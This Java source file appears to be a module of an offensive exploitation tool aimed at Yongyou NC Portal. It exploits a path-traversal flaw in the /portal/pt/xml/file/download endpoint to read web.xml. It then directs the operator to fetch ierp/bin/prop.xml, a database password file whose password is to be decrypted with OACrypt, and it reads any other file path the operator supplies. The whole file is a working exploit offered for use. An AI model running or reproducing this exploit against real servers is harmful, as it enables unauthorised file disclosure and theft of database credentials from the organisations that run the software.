package exp.oa.yongyou.nc;

import core.Exploitlnterface;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.HttpTools;
import utils.Response;

import java.io.File;
import java.util.HashMap;

public class yongyou_nc_PortalPt_FileDownload implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea, TextArea textArea_cmd) {
        return att(url, textArea, textArea_cmd);
    }

    @Override
    public Boolean checkVulCmd(String url, String cmd, TextArea textArea, TextArea textArea_cmd) {
        Platform.runLater(() -> {
            textArea.appendText("\n 查找<password>内容利用OACrypt模块进行解密");
        });
        return attcmd(url,cmd, textArea,textArea_cmd);
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        return null;
    }

    private Boolean att(String url, TextArea textArea, TextArea textArea_cmd) {
        try {
            HashMap<String, String> head = new HashMap<>();
            head.put("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0");
            head.put("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8");
            Response get_res = HttpTools.get(url + "/portal/pt/xml/file/download?pageId=login&filename=..\\WEB-INF\\web.xml" , head, "utf-8");
            if (get_res.getCode() == 200 && get_res.getText().contains("NC Portal")) {
                Platform.runLater(() -> {
                    textArea.appendText("\n [ yongyou_nc_PortalPt_FileDownload ]");
                    textArea.appendText("\n 配置信息页面: "+url + "/portal/pt/xml/file/download?pageId=login&filename=..\\WEB-INF\\web.xml");
                    textArea_cmd.appendText("\n ---------------------------web.xml---------------------------\n"+get_res.getText());
                    textArea.appendText("\n CMD输入文件路径,(数据库密码文件): ..\\..\\..\\ierp/bin/prop.xml\n");
                });

                return true;
            }else{
                Platform.runLater(() -> {
                    textArea.appendText("\n");
                });
                return false;
            }

        } catch (Exception e) {
            Platform.runLater(() -> {
                textArea.appendText("\n 连接异常！！！");
            });
        }
        return false;
    }

    private boolean attcmd( String url,String cmd,TextArea textArea, TextArea textArea_cmd){
        try {
            Response get_res = HttpTools.get(url + "/portal/pt/xml/file/download?pageId=login&filename="+cmd, new HashMap<>(), "utf-8");

            if (get_res.getCode() == 200) {
                Platform.runLater(() -> {
                    textArea.appendText("\n "+ cmd +" 读取成功！");
                    textArea_cmd.appendText("\n ---------------------------"+new File(cmd).getName()+"---------------------------\n"+get_res.getText());
                });
                return true;
            } else {
                Platform.runLater(() -> {
                    textArea.appendText("\n "+ cmd +" 读取失败！");
                });
                return false;
            }

        } catch (Exception e) {
            Platform.runLater(() -> {
//                textArea.appendText("\n yongyou_nc_UploadServlet_serial-漏洞不存在");
                textArea.appendText("\n 连接异常！！！");
            });
        }
        return false;
    }

}
